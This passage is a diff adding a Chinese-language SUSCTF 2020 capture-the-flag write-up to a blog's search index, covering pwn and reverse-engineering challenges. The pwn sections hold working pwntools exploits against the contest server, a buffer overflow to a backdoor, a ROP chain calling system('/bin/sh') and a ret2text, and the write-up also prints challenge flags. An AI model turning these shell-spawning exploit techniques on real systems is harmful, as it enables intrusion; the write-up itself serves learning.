&amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>) )</span><br><span class="line">    backdoor(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>所以，只要<code>s1=&quot;btis_wants_girlfriends&quot;</code>即可，查看栈信息<br><img src="/2020/10/20/SUS2020/babystackbuf.png"><br>只要填充<code>&#39;a&#39;*0x30</code>即可覆盖到s1，因此有exp如下  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&quot;btis_wants_girlfriends&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Pwn-babyrop"><a href="#Pwn-babyrop" class="headerlink" title="[Pwn]babyrop"></a>[Pwn]babyrop</h4><h5 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p><code>checksec babyrop</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure></li>
+<li><p>IDA64打开，直接F5，<code>main()</code>  </p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy rop&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>read存在栈溢出漏洞，填入0x68个’a’就可达返回地址，但是broken_backdoor只能<code>ls</code>，并不是我们想要的，所以需要构造ROP<br><a href="https://blog.csdn.net/michaelinfinity/article/details/88584349">类似题目</a>  </p>
+</li>
+<li><p>可通过IDA直接SHIFT+F12找到<code>/bin/sh</code>地址为0x601050<br><img src="/2020/10/20/SUS2020/babyropbin.png">  </p>
+</li>
+<li><p>函数窗口查看<code>_system()</code>地址0x400540<br><img src="/2020/10/20/SUS2020/babyropsys.png">  </p>
+</li>
+<li><p>因为传入一个参数，所以需要知道rdi地址，利用<code>ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep rdi</code>可得0x400763，所以先覆盖’a’再填入rdi再放binsh再加system即可执行  </p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20007</span>)</span><br><span class="line">rdi = <span class="number">0x400763</span></span><br><span class="line">binsh = <span class="number">0x601050</span></span><br><span class="line">sys_addr = <span class="number">0x400540</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>SUSCTF&#123;29b76a5fedeb34b78d4284e896ced52f&#125;</code></p>
+<h4 id="Pwn-babydoor"><a href="#Pwn-babydoor" class="headerlink" title="[Pwn]babydoor"></a>[Pwn]babydoor</h4><h5 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p><code>checksec babydoor</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000)  </span><br></pre></td></tr></table></figure></li>
+<li><p>IDA64打开，F5，找到<code>main()</code>  </p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy ret2text&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>read存在栈溢出漏洞，传入<code>&#39;a&#39;*0x68</code>即可到达返回地址，exp如下  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20008</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(<span class="number">0x400676</span>) + p64(<span class="number">0x4006fb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Pwn-snake"><a href="#Pwn-snake" class="headerlink" title="[Pwn]snake"></a>[Pwn]snake</h4><h5 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>ssh连上，<code>./snake</code>，然后就硬玩<br><img src="/2020/10/20/SUS2020/snake.png"></li>
+</ol>
+<h4 id="Reverse-迷宫"><a href="#Reverse-迷宫" class="headerlink" title="[Reverse]迷宫"></a>[Reverse]迷宫</h4><h5 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>在IDA中反编译后找到<br><img src="/2020/10/20/SUS2020/maze.png">  </li>
+<li>猜测是个迷宫矩阵，故按8x8排列得到<br><img src="/2020/10/20/SUS2020/modimaze.png">  </li>
+<li>所以出迷宫的方法是：LLLDDRDRRDDLLLD  </li>
+<li><code>./babymaze</code>然后输入以上字符串得结果<br><code>SUSCTF&#123;DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD&#125;</code>  </li>
+</ol>
+<h4 id="Reverse-表面"><a href="#Reverse-表面" class="headerlink" title="[Reverse]表面"></a>[Reverse]表面</h4><h5 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>用IDA打开，在<code>main()</code>中注意到有一个wrongans很可疑，查看一下，在其相邻的地方有<br><img src="/2020/10/20/SUS2020/rawBanner.png">  </li>
+<li>这就很有意思了，太像一个Banner了，其中还有0x0AH的格式，猜想是需要重新调整格式得到想要的flag，用文本编辑器调一下即可，得到<br><img src="/2020/10/20/SUS2020/babysigninBanner.png">  </li>
+<li>调整一下宽高明显点<br><img src="/2020/10/20/SUS2020/newBabysigninBanner.png"><br>所见即所得<br><code>SUS&#123;all_the_alphabets&#125;</code>  </li>
+</ol>
+<h4 id="Reverse-静置"><a href="#Reverse-静置" class="headerlink" title="[Reverse]静置"></a>[Reverse]静置</h4><h5 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>拖到IDA反编译，SHIFT+F12查看字符串<br><img src="/2020/10/20/SUS2020/babyre.png">  </li>
+<li>查看mov<br><img src="/2020/10/20/SUS2020/babyremov.png">  </li>
+<li>16进制转ASCII即可  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x7D</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p><code>SUSCTF&#123;W3lcome_to_SUSCTF_2020_RE#&#125;</code></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
       <tags>
-        <tag>Test</tag>
+        <tag>CTF</tag>
+        <tag>WP</tag>
       </tags>
   </entry>
 </search>
